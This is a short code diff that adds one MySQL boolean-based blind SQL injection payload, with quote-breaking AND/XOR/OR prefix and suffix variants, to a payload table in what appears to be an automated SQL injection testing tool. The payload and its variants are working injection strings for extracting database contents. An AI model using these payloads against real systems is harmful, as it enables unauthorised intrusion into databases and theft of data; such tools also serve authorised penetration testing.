@@ -436,6 +436,20 @@ PAYLOADS = {
                 "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))",
                 "dbms": "MySQL",
             },
+            {
+                "payload": "(IF([RANDNUM]=[RANDNUM],1,(select table_name from information_schema.tables)))",
+                "comments": [
+                    {"pref": "'AND", "suf": "AND'Z"},
+                    {"pref": '"AND', "suf": 'AND"Z'},
+                    {"pref": "'XOR", "suf": "XOR'Z"},
+                    {"pref": '"XOR', "suf": 'XOR"Z'},
+                    {"pref": "'OR", "suf": "OR'Z"},
+                    {"pref": '"OR', "suf": 'OR"Z'},
+                ],
+                "title": "MySQL boolean-based blind - (IF STATEMENT)",
+                "vector": "(IF([INFERENCE],1,(select table_name from information_schema.tables)))",
+                "dbms": "MySQL",
+            },
         ],
         "time-based": [
             {
